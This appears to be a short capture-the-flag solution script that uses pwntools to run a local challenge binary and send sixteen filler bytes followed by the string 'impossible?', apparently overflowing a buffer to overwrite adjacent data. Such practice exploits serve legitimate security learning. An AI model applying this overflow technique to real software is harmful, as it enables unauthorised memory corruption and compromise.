from pwn import*
import pwn

pawn = pwn.process("./chal")

pawn.sendline(b"a"*16 + b"impossible?")
pawn.interactive()
